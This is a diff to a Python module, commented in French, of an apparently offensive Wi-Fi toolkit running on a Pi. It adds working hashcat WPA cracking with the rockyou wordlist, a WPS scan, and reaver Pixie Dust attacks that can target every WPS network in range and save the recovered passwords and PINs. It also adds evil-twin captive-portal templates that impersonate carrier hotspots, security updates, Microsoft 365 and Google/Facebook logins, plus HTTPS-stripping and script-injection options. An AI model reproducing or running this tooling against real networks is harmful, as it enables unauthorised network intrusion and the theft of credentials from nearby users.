@@ -24,6 +24,7 @@ Notes d'implémentation :
   - `run()` est englobé dans un try/except global qui capture les
     exceptions et les renvoie en {ok:false, error} + log stderr → journalctl.
 """
+import json
 import os
 import re
 import select as _sel
@@ -71,7 +72,10 @@ KRACK_PCAP = KRACK_DIR / "krack-capture.pcap"
 
 VALID_TEMPLATES = ("wifi-auth", "wifi-resaisir",
                    "cafe", "hotel", "gare", "airport", "mall", "wifi-app",
+                   "operator", "update", "corporate", "social-wifi",
                    "custom")
+
+_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mGKHJ]")
 
 
 class _StopRequested(Exception):
@@ -464,6 +468,7 @@ class WifiModule(BaseModule):
     def __init__(self):
         self._last_aps: List[Dict[str, Any]] = []
         self._last_stations: List[Dict[str, Any]] = []
+        self._last_wps_aps: List[Dict[str, Any]] = []
 
     def _iface(self) -> Optional[str]:
         try:
@@ -488,7 +493,15 @@ class WifiModule(BaseModule):
             "last_stations": [{
                 "mac": s["mac"], "bssid": s["bssid"],
                 "ap_essid": s["ap_essid"], "power": s["power"],
+                "packets": s.get("packets", 0),
+                "probes": s.get("probes", []),
             } for s in self._last_stations],
+            "last_wps_aps": [{
+                "bssid": w["bssid"], "essid": w["essid"],
+                "channel": w["channel"], "wps_version": w["wps_version"],
+                "wps_locked": w["wps_locked"], "power": w.get("power", 0),
+            } for w in self._last_wps_aps],
+            "memory_networks": memory.list_networks(),
         }
 
     def actions(self) -> List[Action]:
@@ -588,6 +601,10 @@ class WifiModule(BaseModule):
                             {"value": "airport",       "label": "Aéroport ✈️"},
                             {"value": "mall",          "label": "Centre commercial 🛍️"},
                             {"value": "wifi-app",      "label": "📲 App WiFi requise (push APK)"},
+                            {"value": "operator",      "label": "🌐 Hotspot opérateur (Orange/Free)"},
+                            {"value": "update",        "label": "⚠️ Mise à jour sécurité (mdp WiFi)"},
+                            {"value": "corporate",     "label": "💼 Microsoft 365 / entreprise"},
+                            {"value": "social-wifi",   "label": "🔵 Social WiFi (Google/Facebook)"},
                             {"value": "custom",        "label": "✏️ HTML personnalisé"},
                         ], "default": "wifi-auth"},
                        {"name": "custom_portal_html",
@@ -650,6 +667,44 @@ class WifiModule(BaseModule):
                         "default": DEFAULT_EVILTWIN_DURATION,
                         "min": 30, "max": 600},
                    ]),
+            Action("crack", "Crack WiFi (hashcat)", "capture",
+                   description="hashcat -m 22000 sur PMKID ou handshake capturé. "
+                               "Utilise le GPU si dispo, sinon CPU. "
+                               "Convertit automatiquement les .cap en .22000.",
+                   hint="capture un PMKID ou handshake d'abord",
+                   params=[
+                       {"name": "bssid", "label": "Réseau cible",
+                        "type": "memory_network"},
+                       {"name": "wordlist", "label": "Wordlist",
+                        "type": "select",
+                        "options": [
+                            {"value": "/usr/share/wordlists/fasttrack.txt",
+                             "label": "fasttrack.txt (rapide, 222 mots)"},
+                            {"value": "/usr/share/wordlists/rockyou.txt",
+                             "label": "rockyou.txt (14M mots)"},
+                            {"value": "_custom", "label": "Chemin custom..."},
+                        ], "default": "/usr/share/wordlists/fasttrack.txt"},
+                       {"name": "wordlist_custom", "label": "Chemin wordlist",
+                        "type": "text", "default": "",
+                        "placeholder": "/chemin/vers/ma_wordlist.txt",
+                        "show_if": {"wordlist": "_custom"}},
+                   ]),
+            Action("wps_scan", "Scan WPS (wash)", "passive",
+                   description="Détecte les réseaux avec WPS activé via `wash`. "
+                               "Nécessaire avant Pixie Dust.",
+                   params=[{"name": "duration", "label": "Durée scan (s)",
+                            "type": "int", "default": 15, "min": 5, "max": 60}]),
+            Action("pixie_dust", "Pixie Dust (WPS)", "active",
+                   description="Attaque Pixie Dust via reaver -K. Exploite la "
+                               "génération faible du nonce WPS pour retrouver le "
+                               "PIN puis le mot de passe WPA en quelques secondes. "
+                               "Lance un scan WPS d'abord.",
+                   hint="lance un Scan WPS d'abord",
+                   params=[
+                       {"name": "target", "label": "Cible", "type": "target_wps_ap"},
+                       {"name": "timeout", "label": "Timeout / réseau (s)",
+                        "type": "int", "default": 120, "min": 30, "max": 600},
+                   ]),
         ]
 
     # ── Implémentations actions ─────────────────────────────────────────────
@@ -670,15 +725,63 @@ class WifiModule(BaseModule):
         return None
 
     def _scan(self, duration: int) -> Dict[str, Any]:
+        """Scan live : envoie __APS_LIVE__ toutes les 2s au frontend."""
         err = self._preflight()
         if err:
             return err
         iface = self._iface()
-        csv_path = _run_airodump_session(iface, duration)
-        if csv_path is None:
-            return {"ok": False, "error": "Aucun CSV produit."}
-        aps = _parse_aps(csv_path)
-        self._last_aps = aps
+        task = current_task()
+
+        _clean_scan_dir()
+        mon_iface = _enter_monitor(iface)
+        try:
+            cmd = ["sudo", "-n", "airodump-ng",
+                   "-w", str(SCAN_PREFIX),
+                   "--output-format", "csv",
+                   "--write-interval", "1",
+                   mon_iface]
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL)
+            start = time.time()
+            prev_count = 0
+            while time.time() - start < duration:
+                if task and task.is_stopped():
+                    task.log("Stop demandé — arrêt du scan", "warn")
+                    break
+                time.sleep(2)
+                csvs = sorted(SCAN_PREFIX.parent.glob(
+                    f"{SCAN_PREFIX.name}-*.csv"))
+                if csvs:
+                    aps = _parse_aps(csvs[-1])
+                    self._last_aps = aps
+                    if len(aps) != prev_count and task:
+                        task.log(f"__APS_LIVE__{json.dumps(aps)}")
+                        prev_count = len(aps)
+                    elapsed = int(time.time() - start)
+                    if task:
+                        task.log(f"📡 {len(aps)} AP(s) · {elapsed}s/{duration}s")
+            # Kill proprement
+            try:
+                proc.send_signal(signal.SIGINT)
+                proc.wait(timeout=10)
+            except (subprocess.TimeoutExpired, ProcessLookupError):
+                proc.kill()
+            subprocess.run(["sudo", "-n", "pkill", "-INT", "airodump-ng"],
+                           capture_output=True, timeout=5)
+        finally:
+            _exit_monitor(mon_iface)
+
+        # Parse final
+        csvs = sorted(SCAN_PREFIX.parent.glob(f"{SCAN_PREFIX.name}-*.csv"))
+        if csvs:
+            aps = _parse_aps(csvs[-1])
+            self._last_aps = aps
+        else:
+            aps = self._last_aps
+        if task and aps:
+            task.log(f"__APS_LIVE__{json.dumps(aps)}")
+        if not aps:
+            return {"ok": False, "error": "Aucun AP détecté."}
         return {
             "ok": True, "iface": iface, "duration": duration,
             "count": len(aps), "aps": aps,
@@ -686,12 +789,12 @@ class WifiModule(BaseModule):
         }
 
     def _clients(self, duration: int, target_bssid: str = "") -> Dict[str, Any]:
+        """Scan clients live : envoie __APS_LIVE__ + __STA_LIVE__ toutes les 2s."""
         err = self._preflight()
         if err:
             return err
         iface = self._iface()
         task = current_task()
-        # Si BSSID fourni → filtre airodump sur ce réseau (résolution canal)
         bssid_arg = None
         channel_arg = None
         if target_bssid:
@@ -699,31 +802,86 @@ class WifiModule(BaseModule):
             if target:
                 bssid_arg = target["bssid"]
                 channel_arg = target["channel"]
-                if task: task.log(f"Filtrage sur {target['essid']} "
-                                  f"({target['bssid']}, ch{target['channel']})")
+                if task:
+                    task.log(f"Filtrage sur {target['essid']} "
+                             f"({target['bssid']}, ch{target['channel']})")
             else:
-                if task: task.log(f"BSSID {target_bssid} introuvable → "
-                                  "scan large (tous réseaux)", "warn")
-        csv_path = _run_airodump_session(iface, duration,
-                                         bssid=bssid_arg, channel=channel_arg)
-        if csv_path is None:
-            # Retry une fois : reset propre + tentative
-            if task: task.log("CSV vide, retry après cleanup forcé…", "warn")
-            subprocess.run(["sudo", "-n", "pkill", "-9", "airodump-ng"],
+                if task:
+                    task.log(f"BSSID {target_bssid} introuvable → "
+                             "scan large (tous réseaux)", "warn")
+
+        _clean_scan_dir()
+        mon_iface = _enter_monitor(iface)
+        try:
+            cmd = ["sudo", "-n", "airodump-ng",
+                   "-w", str(SCAN_PREFIX),
+                   "--output-format", "csv",
+                   "--write-interval", "1"]
+            if bssid_arg:
+                cmd += ["--bssid", bssid_arg]
+            if channel_arg:
+                cmd += ["-c", str(channel_arg)]
+            cmd.append(mon_iface)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL)
+            start = time.time()
+            prev_ap = 0
+            prev_sta = 0
+            while time.time() - start < duration:
+                if task and task.is_stopped():
+                    task.log("Stop demandé — arrêt du scan", "warn")
+                    break
+                time.sleep(2)
+                csvs = sorted(SCAN_PREFIX.parent.glob(
+                    f"{SCAN_PREFIX.name}-*.csv"))
+                if csvs:
+                    aps = _parse_aps(csvs[-1])
+                    self._last_aps = aps
+                    aps_by_bssid = {a["bssid"]: a for a in aps}
+                    stations = _parse_stations(csvs[-1], aps_by_bssid)
+                    self._last_stations = stations
+                    changed = (len(aps) != prev_ap or
+                               len(stations) != prev_sta)
+                    if changed and task:
+                        task.log(f"__APS_LIVE__{json.dumps(aps)}")
+                        task.log(f"__STA_LIVE__{json.dumps(stations)}")
+                        prev_ap = len(aps)
+                        prev_sta = len(stations)
+                    elapsed = int(time.time() - start)
+                    if task:
+                        task.log(f"📡 {len(aps)} AP(s) · "
+                                 f"{len(stations)} station(s) · "
+                                 f"{elapsed}s/{duration}s")
+            try:
+                proc.send_signal(signal.SIGINT)
+                proc.wait(timeout=10)
+            except (subprocess.TimeoutExpired, ProcessLookupError):
+                proc.kill()
+            subprocess.run(["sudo", "-n", "pkill", "-INT", "airodump-ng"],
                            capture_output=True, timeout=5)
-            time.sleep(2)
-            csv_path = _run_airodump_session(iface, duration,
-                                             bssid=bssid_arg,
-                                             channel=channel_arg)
-            if csv_path is None:
-                return {"ok": False,
-                        "error": "Aucun CSV produit (airodump KO 2×). "
-                                 "Vérifie wlan1 : `iw dev wlan1 info`."}
-        aps = _parse_aps(csv_path)
-        self._last_aps = aps
-        aps_by_bssid = {a["bssid"]: a for a in aps}
-        stations = _parse_stations(csv_path, aps_by_bssid)
-        self._last_stations = stations
+        finally:
+            _exit_monitor(mon_iface)
+
+        # Parse final
+        csvs = sorted(SCAN_PREFIX.parent.glob(f"{SCAN_PREFIX.name}-*.csv"))
+        if csvs:
+            aps = _parse_aps(csvs[-1])
+            self._last_aps = aps
+            aps_by_bssid = {a["bssid"]: a for a in aps}
+            stations = _parse_stations(csvs[-1], aps_by_bssid)
+            self._last_stations = stations
+        else:
+            aps = self._last_aps
+            stations = self._last_stations
+        if task:
+            if aps:
+                task.log(f"__APS_LIVE__{json.dumps(aps)}")
+            if stations:
+                task.log(f"__STA_LIVE__{json.dumps(stations)}")
+        if not stations and not aps:
+            return {"ok": False,
+                    "error": "Aucun CSV produit (airodump KO). "
+                             "Vérifie wlan1 : `iw dev wlan1 info`."}
         return {
             "ok": True, "iface": iface, "duration": duration,
             "count": len(stations), "stations": stations,
@@ -763,20 +921,30 @@ class WifiModule(BaseModule):
             "sudo", "-n", "wifite",
             "-i", iface,
             "-b", target["bssid"],
+            "-c", str(target["channel"]),  # lock canal → détecte cible immédiatement
             "--kill",          # tue les processus qui squattent wlan1
-            "--clear-color",   # pas de codes ANSI dans l'output
-            "--skip-crack",    # capture seulement (cassage = côté PC + hashcat)
+            "--skip-crack",    # capture seulement (cassage = côté Pi/PC)
         ]
+
+        # wifite appelle `stty size` pour la taille du terminal →
+        # crash en subprocess sans TTY. On alloue un pseudo-terminal.
+        import pty as _pty, fcntl, termios, struct
+        master_fd, slave_fd = _pty.openpty()
+        # Configurer la taille du PTY (rows=40, cols=120)
+        winsize = struct.pack("HHHH", 40, 120, 0, 0)
+        fcntl.ioctl(slave_fd, termios.TIOCSWINSZ, winsize)
 
         proc = subprocess.Popen(
             cmd,
             cwd=str(wifite_dir),
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
+            stdin=slave_fd,   # PTY → stty size fonctionne
             bufsize=1,
             text=True,
             errors="replace",
         )
+        os.close(slave_fd)  # plus besoin côté parent
 
         import threading
         stop_thread = threading.Event()
@@ -786,11 +954,8 @@ class WifiModule(BaseModule):
                 for line in proc.stdout:
                     if stop_thread.is_set():
                         break
-                    line = line.rstrip()
-                    if line and task:
-                        # wifite imprime des banners ASCII — on les skip
-                        if line.startswith(("===", "---", "   ")):
-                            continue
+                    line = _ANSI_RE.sub("", line.rstrip())
+                    if line.strip() and task:
                         task.log(line)
             except Exception:
                 pass
@@ -826,6 +991,11 @@ class WifiModule(BaseModule):
                                capture_output=True, timeout=5)
             stop_thread.set()
             rdr.join(timeout=5)
+            # Fermer le master du PTY
+            try:
+                os.close(master_fd)
+            except OSError:
+                pass
 
         # Collecter les fichiers produits par wifite + archiver en Mémoire
         # Wifite v2 stocke dans subfolder hs/ (handshakes) et root (PMKID hash)
@@ -858,8 +1028,7 @@ class WifiModule(BaseModule):
             msg = (f"✅ Wifite a capturé sur <b>{escape(target['essid'])}</b> :\n"
                    f"  • {len(stored_caps)} handshake(s) (.cap)\n"
                    f"  • {len(stored_pmkids)} PMKID(s) (.22000)\n"
-                   f"Voir la carte <b>Mémoire</b> pour télécharger et cracker "
-                   f"avec hashcat côté PC.")
+                   f"Lance <b>Crack mot de passe WiFi</b> pour tenter le cassage.")
         else:
             msg = (f"Wifite terminé sur <b>{escape(target['essid'])}</b> sans "
                    "capture exploitable.\n"
@@ -941,6 +1110,466 @@ class WifiModule(BaseModule):
                             "Pistes : augmente la durée, ou ajoute un deauth ciblé sur "
                             "un client spécifique (action `Handshake WPA2 — deauth`).")}
 
+    # ── WPS Scan & Pixie Dust ────────────────────────────────────────────
+
+    def _wps_scan(self, duration: int) -> Dict[str, Any]:
+        """Scan des réseaux WPS via wash."""
+        err = self._preflight()
+        if err:
+            return err
+        task = current_task()
+        iface = self._iface()
+
+        mon = _enter_monitor(iface)
+        if task:
+            task.log(f"=== Scan WPS (wash) — {duration}s sur {mon} ===")
+
+        # wash -i wlan1mon -s (scan, pas de checksum)
+        cmd = ["sudo", "wash", "-i", mon]
+        try:
+            proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                text=True, errors="replace", bufsize=1)
+
+            wps_aps: List[Dict[str, Any]] = []
+            header_skipped = False
+            deadline = time.time() + duration
+
+            try:
+                while time.time() < deadline:
+                    # Lire ligne par ligne avec timeout
+                    rlist, _, _ = _sel.select([proc.stdout], [], [], 1.0)
+                    if not rlist:
+                        continue
+                    line = proc.stdout.readline()
+                    if not line:
+                        break
+                    line = line.strip()
+                    if not line:
+                        continue
+                    # wash output : BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
+                    # Sauter les lignes d'en-tête et séparateurs
+                    if line.startswith("BSSID") or line.startswith("---"):
+                        header_skipped = True
+                        continue
+                    if not header_skipped:
+                        continue
+                    parts = line.split()
+                    if len(parts) < 6:
+                        continue
+                    bssid_w = parts[0].upper()
+                    try:
+                        ch = int(parts[1])
+                    except ValueError:
+                        ch = 0
+                    try:
+                        pwr = int(parts[2])
+                    except ValueError:
+                        pwr = 0
+                    wps_ver = parts[3]         # "1.0" ou "2.0"
+                    locked = parts[4] == "Yes"  # "Yes" ou "No"
+                    essid_w = " ".join(parts[5:])  # le reste = ESSID
+                    # Éviter les doublons
+                    if any(w["bssid"] == bssid_w for w in wps_aps):
+                        continue
+                    wps_aps.append({
+                        "bssid": bssid_w, "essid": essid_w,
+                        "channel": ch, "power": pwr,
+                        "wps_version": wps_ver, "wps_locked": locked,
+                    })
+                    lck = "🔒" if locked else "✅"
+                    if task:
+                        task.log(f"  {lck} {essid_w} ({bssid_w}) ch{ch} WPS{wps_ver} "
+                                 f"{pwr}dBm{' [LOCKED]' if locked else ''}")
+            finally:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+
+        finally:
+            _exit_monitor(mon)
+
+        self._last_wps_aps = wps_aps
+
+        if not wps_aps:
+            return {"ok": True,
+                    "message": f"Aucun réseau WPS détecté en {duration}s.\n"
+                               "Le WPS est peut-être désactivé sur les APs à portée."}
+
+        unlocked = [w for w in wps_aps if not w["wps_locked"]]
+        msg = (f"<b>{len(wps_aps)} réseau(x) WPS</b> détecté(s) en {duration}s "
+               f"({len(unlocked)} non verrouillé(s)).\n\n")
+        for w in wps_aps:
+            lck = "🔒 LOCKED" if w["wps_locked"] else "✅ ouvert"
+            msg += (f"• <b>{escape(w['essid'])}</b> ({w['bssid']}) "
+                    f"ch{w['channel']} WPS{w['wps_version']} — {lck}\n")
+        if unlocked:
+            msg += "\nLance <b>Pixie Dust</b> pour tenter l'attaque."
+        else:
+            msg += ("\n⚠ Tous verrouillés — Pixie Dust peut quand même "
+                    "fonctionner sur certains firmwares.")
+        return {"ok": True, "wps_count": len(wps_aps),
+                "unlocked": len(unlocked), "message": msg}
+
+    def _pixie_dust(self, target: str, timeout: int) -> Dict[str, Any]:
+        """Pixie Dust via reaver -K sur 1 cible ou tous les WPS."""
+        err = self._preflight()
+        if err:
+            return err
+        task = current_task()
+        iface = self._iface()
+
+        # Déterminer les cibles
+        if target and target != "_all":
+            # Cible unique : chercher dans le cache WPS
+            ap = None
+            for w in self._last_wps_aps:
+                if w["bssid"] == target.upper():
+                    ap = w
+                    break
+            if not ap:
+                # Fallback : chercher dans last_aps
+                resolved = self._resolve_target(target)
+                if resolved:
+                    ap = {"bssid": resolved["bssid"],
+                          "essid": resolved["essid"],
+                          "channel": resolved["channel"],
+                          "wps_version": "?", "wps_locked": False,
+                          "power": resolved.get("power", 0)}
+                else:
+                    return {"ok": False,
+                            "error": f"Cible {target} introuvable. Lance un Scan WPS d'abord."}
+            targets = [ap]
+        else:
+            # Tous les WPS
+            if not self._last_wps_aps:
+                return {"ok": False,
+                        "error": "Aucun réseau WPS en cache. Lance un Scan WPS d'abord."}
+            targets = list(self._last_wps_aps)
+
+        if task:
+            task.log(f"=== Pixie Dust — {len(targets)} cible(s) / timeout {timeout}s ===")
+
+        mon = _enter_monitor(iface)
+        results = []
+        try:
+            for i, ap in enumerate(targets, 1):
+                bssid_t = ap["bssid"]
+                essid_t = ap.get("essid", "?")
+                ch_t = ap.get("channel", 0)
+                if task:
+                    task.log(f"\n--- [{i}/{len(targets)}] {essid_t} "
+                             f"({bssid_t}) ch{ch_t} ---")
+
+                # reaver -i wlan1mon -b BSSID -c CH -K 1 -vv
+                cmd = ["sudo", "reaver",
+                       "-i", mon,
+                       "-b", bssid_t,
+                       "-K", "1",  # Pixie Dust
+                       "-vv"]      # verbose
+                if ch_t:
+                    cmd += ["-c", str(ch_t)]
+
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    text=True, errors="replace", bufsize=1)
+
+                pin = None
+                password = None
+                locked_detected = False
+                try:
+                    deadline = time.time() + timeout
+                    for line in iter(proc.stdout.readline, ""):
+                        if time.time() > deadline:
+                            if task:
+                                task.log(f"  ⏱ Timeout {timeout}s atteint.")
+                            break
+                        line = line.rstrip()
+                        if not line:
+                            continue
+                        clean = _ANSI_RE.sub("", line).strip()
+                        if not clean:
+                            continue
+                        # Log les lignes intéressantes
+                        if task:
+                            low = clean.lower()
+                            if any(k in low for k in
+                                   ["pin", "key", "wps", "nonce",
+                                    "secret", "psk", "trying",
+                                    "associated", "waiting",
+                                    "pixie", "failed", "locked",
+                                    "timeout", "success"]):
+                                task.log(f"  {clean}")
+
+                        # Détecter le PIN trouvé
+                        pm = re.search(r"WPS PIN:\s*'?(\d+)'?", clean)
+                        if pm:
+                            pin = pm.group(1)
+                            if task:
+                                task.log(f"  🔑 PIN WPS trouvé : {pin}", "warn")
+
+                        # Détecter le mot de passe WPA
+                        km = re.search(r"WPA PSK:\s*'(.+?)'", clean)
+                        if km:
+                            password = km.group(1)
+                            if task:
+                                task.log(f"  🔑 MOT DE PASSE : {password}", "warn")
+
+                        # Détecter WPS locked
+                        if "locked" in clean.lower() and "rate" in clean.lower():
+                            locked_detected = True
+                            if task:
+                                task.log(f"  🔒 WPS rate-limited / verrouillé.", "warn")
+
+                        # Si on a le password, on arrête
+                        if password:
+                            break
+
+                finally:
+                    proc.terminate()
+                    try:
+                        proc.wait(timeout=10)
+                    except subprocess.TimeoutExpired:
+                        subprocess.run(["sudo", "pkill", "-f",
+                                        f"reaver.*{bssid_t}"],
+                                       capture_output=True, timeout=5)
+                        proc.kill()
+
+                result = {
+                    "bssid": bssid_t, "essid": essid_t,
+                    "pin": pin, "password": password,
+                    "locked": locked_detected,
+                }
+                results.append(result)
+
+                # Sauvegarder en mémoire si mot de passe trouvé
+                if password:
+                    safe_bssid = bssid_t.upper().replace(":", "-")
+                    cap_dir = Path.home() / "nexuspi-data" / "captures" / safe_bssid
+                    cap_dir.mkdir(parents=True, exist_ok=True)
+                    # Sauver cracked.txt
+                    (cap_dir / "cracked.txt").write_text(password + "\n")
+                    # Sauver wps_pin.txt
+                    if pin:
+                        (cap_dir / "wps_pin.txt").write_text(pin + "\n")
+                    # Mettre à jour meta.json
+                    meta_file = cap_dir / "meta.json"
+                    meta = {}
+                    if meta_file.exists():
+                        try:
+                            meta = json.loads(meta_file.read_text())
+                        except Exception:
+                            pass
+                    meta.update({
+                        "bssid": bssid_t, "essid": essid_t,
+                        "channel": ch_t, "cracked_password": password,
+                        "wps_pin": pin, "attack": "pixie_dust",
+                    })
+                    meta_file.write_text(json.dumps(meta, indent=2))
+                    if task:
+                        task.log(f"  💾 Résultat sauvegardé dans {cap_dir}")
+
+        finally:
+            _exit_monitor(mon)
+
+        # Synthèse
+        cracked = [r for r in results if r["password"]]
+        pinned = [r for r in results if r["pin"] and not r["password"]]
+        locked = [r for r in results if r["locked"]]
+        failed = [r for r in results
+                  if not r["password"] and not r["pin"] and not r["locked"]]
+
+        msg = f"<b>Pixie Dust — {len(results)} réseau(x) testé(s)</b>\n\n"
+        if cracked:
+            msg += "🔑 <b>Craqués :</b>\n"
+            for r in cracked:
+                msg += (f"  • <b>{escape(r['essid'])}</b> ({r['bssid']}) "
+                        f"— PIN {r['pin']} — PSK <code>{escape(r['password'])}</code>\n")
+        if pinned:
+            msg += "\n📌 <b>PIN trouvé (PSK non récupéré) :</b>\n"
+            for r in pinned:
+                msg += (f"  • {escape(r['essid'])} ({r['bssid']}) "
+                        f"— PIN {r['pin']}\n")
+        if locked:
+            msg += "\n🔒 <b>WPS verrouillé :</b>\n"
+            for r in locked:
+                msg += f"  • {escape(r['essid'])} ({r['bssid']})\n"
+        if failed:
+            msg += "\n❌ <b>Échoué / non vulnérable :</b>\n"
+            for r in failed:
+                msg += f"  • {escape(r['essid'])} ({r['bssid']})\n"
+
+        if not cracked:
+            msg += ("\nAucun réseau vulnérable au Pixie Dust. "
+                    "Les routeurs récents sont souvent patchés.")
+
+        return {"ok": True, "results": results,
+                "cracked": len(cracked), "message": msg}
+
+    # ── Crack ──────────────────────────────────────────────────────────────
+
+    def _crack(self, bssid: str,
+               wordlist: str) -> Dict[str, Any]:
+        """Crack hashcat -m 22000 sur un handshake/PMKID déjà capturé."""
+        task = current_task()
+        if not bssid:
+            return {"ok": False, "error": "Sélectionne un réseau cible."}
+
+        # Trouver les fichiers de capture en mémoire
+        safe_bssid = bssid.upper().replace(":", "-")
+        cap_dir = Path.home() / "nexuspi-data" / "captures" / safe_bssid
+        if not cap_dir.is_dir():
+            return {"ok": False,
+                    "error": f"Aucune capture pour {bssid}. Lance un handshake ou PMKID d'abord."}
+
+        # Chercher les fichiers exploitables
+        # Chercher partout : handshakes/, pmkid/, racine
+        caps = sorted(cap_dir.glob("handshakes/*.cap"))
+        caps += sorted(cap_dir.glob("*.cap"))
+        h22000 = sorted(cap_dir.glob("pmkid/*.22000"))
+        h22000 += sorted(cap_dir.glob("handshakes/*.22000"))
+        h22000 += sorted(cap_dir.glob("*.22000"))
+
+        # Charger meta pour essid
+        meta_file = cap_dir / "meta.json"
+        essid = bssid
+        if meta_file.exists():
+            try:
+                meta = json.loads(meta_file.read_text())
+                essid = meta.get("essid", bssid)
+            except Exception:
+                pass
+
+        if not caps and not h22000:
+            return {"ok": False,
+                    "error": f"Aucun fichier de capture pour {bssid}. "
+                             "Lance un handshake ou PMKID d'abord."}
+
+        if task:
+            task.log(f"=== Crack hashcat sur {essid} ({bssid}) ===")
+
+        # Vérifier la wordlist
+        wl = Path(wordlist)
+        if not wl.is_file():
+            return {"ok": False,
+                    "error": f"Wordlist introuvable : {wordlist}"}
+        try:
+            wc = int(subprocess.check_output(
+                ["wc", "-l", str(wl)], text=True).split()[0])
+            if task:
+                task.log(f"Wordlist : {wl.name} ({wc:,} mots)")
+        except Exception:
+            wc = 0
+
+        # ── hashcat -m 22000 : préférer .22000, sinon convertir le .cap ──
+        hash_file = None
+        if h22000:
+            hash_file = h22000[-1]
+        elif caps:
+            # Convertir .cap → .22000
+            cap_file = caps[-1]
+            converted = cap_dir / "handshakes" / "converted.22000"
+            if task:
+                task.log(f"Conversion {cap_file.name} → .22000...")
+            ret = subprocess.run(
+                ["hcxpcapngtool", "-o", str(converted), str(cap_file)],
+                capture_output=True, text=True, errors="replace")
+            if converted.is_file() and converted.stat().st_size > 0:
+                hash_file = converted
+                if task:
+                    task.log("Conversion OK")
+            else:
+                err_msg = ret.stderr.strip() or ret.stdout.strip()
+                return {"ok": False,
+                        "error": f"Conversion .cap→.22000 échouée. "
+                                 f"Le .cap ne contient peut-être pas de handshake valide.\n{err_msg}"}
+        else:
+            return {"ok": False,
+                    "error": "Aucun fichier .cap/.22000 trouvé. Lance une capture d'abord."}
+
+        if task:
+            task.log(f"Fichier : {hash_file.name}")
+            task.log(f"Lancement hashcat -m 22000...")
+
+        potfile = cap_dir / "hashcat.potfile"
+        cmd = [
+            "hashcat",
+            "-m", "22000",
+            "-a", "0",
+            "--potfile-path", str(potfile),
+            "-o", str(cap_dir / "cracked.txt"),
+            "--outfile-format", "2",  # mot de passe seul
+            str(hash_file),
+            str(wl),
+        ]
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, errors="replace", bufsize=1)
+
+        password = None
+        try:
+            for line in iter(proc.stdout.readline, ""):
+                line = line.rstrip()
+                if not line:
+                    continue
+                clean = _ANSI_RE.sub("", line).strip()
+                if not clean:
+                    continue
+                if task:
+                    # Filtrer le bruit hashcat, garder les lignes utiles
+                    if any(k in clean.lower() for k in
+                           ["status", "speed", "progress", "recovered",
+                            "candidates", "started", "stopped",
+                            "cracked", "exhausted"]):
+                        task.log(f"  {clean}")
+                # Détecter crack réussi
+                if "Cracking performance" in clean or "All hashes" in clean:
+                    continue
+                cm = re.search(r":(.+)$", clean)
+                if "Recovered" in clean and "1/" in clean:
+                    # hashcat a trouvé
+                    pass
+            proc.wait(timeout=600)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            if task:
+                task.log("⚠ Timeout hashcat (10 min)", "warn")
+        finally:
+            if proc.poll() is None:
+                proc.terminate()
+
+        # Lire le résultat
+        cracked_file = cap_dir / "cracked.txt"
+        if cracked_file.is_file() and cracked_file.stat().st_size > 0:
+            password = cracked_file.read_text().strip().split("\n")[-1]
+
+        # Aussi vérifier le potfile
+        if not password and potfile.is_file():
+            for pline in potfile.read_text().splitlines():
+                if ":" in pline:
+                    password = pline.rsplit(":", 1)[-1]
+
+        if password:
+            if task:
+                task.log(f"🔑 MOT DE PASSE TROUVÉ : {password}", "warn")
+            if meta_file.exists():
+                try:
+                    meta = json.loads(meta_file.read_text())
+                    meta["cracked_password"] = password
+                    meta_file.write_text(json.dumps(meta, indent=2))
+                except Exception:
+                    pass
+            return {"ok": True,
+                    "message": f"🔑 <b>{essid}</b> — mot de passe : <code>{password}</code>"}
+
+        if task:
+            task.log("❌ Mot de passe absent du dictionnaire.", "warn")
+        return {"ok": True,
+                "message": f"Crack terminé sur {essid} — mot de passe non trouvé dans {wl.name}.\n"
+                           "Essaie une wordlist plus grosse ou hashcat avec des règles (-r)."}
+
     def _handshake_passive(self, bssid: str, duration: int) -> Dict[str, Any]:
         err = self._preflight()
         if err:
@@ -994,9 +1623,9 @@ class WifiModule(BaseModule):
                 cap_path=cap_path,
             )
             msg = (f"Handshake capturé sur <b>{escape(target['essid'])}</b>{suffix}.\n"
-                   f"BSSID {target['bssid']} ch {target['channel']}\n"
-                   f"Archivé en mémoire : <b>{stored_path}</b>\n"
-                   f"Ouvre la carte <b>Mémoire</b> pour télécharger.")
+                   f"BSSID {target['bssid']} ch {target['channel']}\n\n"
+                   f"Lance <b>Crack mot de passe WiFi</b> pour tenter le cassage.\n"
+                   f"Archivé : <b>{stored_path}</b>")
         else:
             hint = ("Vérifie qu'au moins un client est associé à cet AP (action clients)."
                     if deauth_used else
@@ -1034,10 +1663,14 @@ class WifiModule(BaseModule):
                 channel=target["channel"], encryption=target.get("encryption", ""),
                 pcap_path=pcap, hash_path=PMKID_22000,
             )
+            hash_sample = pmk.get("sample", "")
+            hash_display = (hash_sample[:100] + "…") if len(hash_sample) > 100 else hash_sample
             msg = (f"PMKID capturé sur <b>{escape(target['essid'])}</b> "
-                   f"(BSSID {target['bssid']}).\n"
-                   f"Archivé : <b>{stored.get('22000')}</b>\n"
-                   f"Ouvre la carte <b>Mémoire</b> pour télécharger.")
+                   f"(BSSID {target['bssid']}).\n\n"
+                   f"🔑 Hash (mode 22000) :\n"
+                   f"<code>{escape(hash_display)}</code>\n\n"
+                   f"Lance <b>Crack mot de passe WiFi</b> pour tenter le cassage.\n"
+                   f"Archivé : <b>{stored.get('22000')}</b>")
         else:
             err_extra = pmk.get("error", "")
             msg = (f"Pas de PMKID obtenu en {duration}s sur "
@@ -1227,6 +1860,7 @@ class WifiModule(BaseModule):
                 if inject_script.strip() or strip_https == "yes":
                     inj_env = os.environ.copy()
                     inj_env["NEXUSPI_STRIP_HTTPS"] = "1" if strip_https == "yes" else ""
